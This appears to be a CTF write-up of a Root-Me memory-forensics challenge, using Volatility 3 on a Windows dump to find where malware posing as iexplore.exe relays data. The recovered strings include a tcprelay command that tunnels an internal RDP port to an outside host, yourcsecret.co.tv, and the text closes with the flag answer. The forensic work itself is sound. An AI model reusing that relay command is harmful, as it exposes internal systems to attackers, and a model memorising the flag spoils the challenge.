# Command & Control - level 4

## Challenge Details

- Category: Forensics
- Points: 35
- Validation: 9623
- Author: Thanat0s
- Status: TODO
# Handout
`Command & Control - level 4: Malware analysis; Berthier, thanks to this new information about the processes running on the workstation, it’s clear that this malware is used to exfiltrate data. Find out the ip of the internal server targeted by the hackers! The validation flag should have this format : IP:PORT`
https://static.root-me.org/forensic/ch2/ch2.tbz2
## Walkthrough
It's the same dump from level 2, so our volatility patch should continue working. We already found in level 3 that the malware's executable is: `C:\Users\John Doe\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\iexplore.exe`

We could just dump the process and look for connections made by c2, but this challenge is just asking us for the ip and port, this should be easily doable using netscan 

```bash
$ vol -f ch2.dmp windows.netscan > netscan.txt && rg iexplore netscan.txt
33:0x1dedb4f80.0TCPv4   127.0.0.1DB scan49178fin127.0.0.1       12080   ESTABLISHED     2772    iexplore.exe    -
52:0x1fa21008   TCPv4   127.0.0.1       58785   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
59:0x1fa3ea48   TCPv4   127.0.0.1       58808   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
60:0x1fa41008   TCPv4   127.0.0.1       58797   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
62:0x1fa468b0   TCPv4   127.0.0.1       58747   127.0.0.1       12080   CLOSED  3044    iexplore.exe    -
67:0x1fa5f3d8   TCPv4   127.0.0.1       58823   127.0.0.1       12080   CLOSED  3044    iexplore.exe    -
69:0x1fa78ac0   TCPv4   127.0.0.1       58806   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
70:0x1fa80880   TCPv4   127.0.0.1       58781   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
71:0x1fa83c98   TCPv4   127.0.0.1       58727   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
72:0x1fa859c0   TCPv4   127.0.0.1       58740   127.0.0.1       12080   CLOSED  3044    iexplore.exe    N/A
74:0x1fa9a678   TCPv4   127.0.0.1       58787   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
77:0x1faa97f8   TCPv4   127.0.0.1       58742   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
80:0x1fab2008   TCPv4   127.0.0.1       58791   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
87:0x1fad2988   TCPv4   127.0.0.1       58749   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
91:0x1fada310   TCPv4   127.0.0.1       58733   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
94:0x1fae1ba0   TCPv4   127.0.0.1       58815   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
97:0x1faeddf8   TCPv4   127.0.0.1       58811   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
99:0x1faf7c58   TCPv4   127.0.0.1       58783   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
100:0x1fafe208  TCPv4   127.0.0.1       58738   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
101:0x1fb80df8  TCPv4   127.0.0.1       58792   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
103:0x1fbca1a0  UDPv4   127.0.0.1       60151   *       0               3044    iexplore.exe    2013-01-12 16:57:47.000000 UTC
104:0x1fca0820  TCPv4   127.0.0.1       58729   127.0.0.1       12080   CLOSED  3044    iexplore.exe    -
112:0x1fd57da0  TCPv4   127.0.0.1       58795   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
116:0x1fd92378  TCPv4   127.0.0.1       58817   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
118:0x1fd9b580  TCPv4   127.0.0.1       58731   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
119:0x1fd9f838  TCPv4   127.0.0.1       58758   127.0.0.1       12080   ESTABLISHED     3044    iexplore.exe    -
```

So much for the lazy way, these are all loopback connections, I guess we could use consoles to look for tcprelay processes?

```bash
$ vol -f ch2.dmp windows.consoles
Volatility 3 Framework 2.28.0
Progress:  100.00               PDB scanning finished
PID     Process ConsoleInfo     Property        Address Data
...
  File "/home/hyp3rnov4/.local/lib/python3.13/site-packages/volatility3/framework/plugins/windows/consoles.py", line 348, in create_conhost_symbol_table
    symbol_filename, class_types = cls.determine_conhost_version(
                                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^
        context,
        ^^^^^^^^
    ...<3 lines>...
        conhost_base,
        ^^^^^^^^^^^^^
    )
    ^
  File "/home/hyp3rnov4/.local/lib/python3.13/site-packages/volatility3/framework/plugins/windows/consoles.py", line 317, in determine_conhost_version
    raise NotImplementedError(
        f"This version of Windows is not supported: {nt_major_version}.{nt_minor_version} {vers.MajorVersion}.{vers_minor_version}!"
    )
NotImplementedError: This version of Windows is not supported: 6.1 15.7600!
```

Well that's sad, this piece of internet history isn't supported by vol3, this would have worked in vol2 but im not installing that. Since consoles failed, all conhost based plugins (cmdscan consoles) won't work. I guess we will have to dump the proc memory afterall, so much for saving time.

From level 3, we know the iexplore.exe was pid 2772, with a child cmd.exe with pid 1616

```bash
* 2772  2548    iexplore.exe    0x87b6b030      2       74      1       False   2013-01-12 16:40:34.000000 UTC  N/A     \Device\HarddiskVolume1\Users\John Doe\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\iexplore.exe       "C:\Users\John Doe\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\iexplore.exe"       C:\Users\John Doe\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\iexplore.exe
** 1616 2772    cmd.exe 0x89898030      2       101     1       False   2013-01-12 16:55:49.000000 UTC  N/A     \Device\HarddiskVolume1\Windows\System32\cmd.exe        cmd.exe    C:\Windows\system32\cmd.exe
```

Let's dump both of these:

```bash
 $ mkdir procdump
 $ vol -f ch2.dmp -o procdump windows.memmap --pid 1616 --dump
 $ vol -f ch2.dmp -o procdump windows.memmap --pid 2772 --dump
```

I'd have preferred to look for the connection in consoles, but let's just look for tcprelay.exe in these as vol3 is too cool to play with the old dumps:

```bash
$ strings procdump/* | rg tcprelay
tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443
tcprelay.c
C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeJ"
C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeN_
C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exeg[j
C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
5C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exeg[j
```

And there it is! 192.168.0.22:3389 to the relay endpoint yourcsecret.co.tv:443

The port is 3389.. are exploiting rdp here? Next levels could be quite interesting.

# FLAG
192.168.0.22:3389
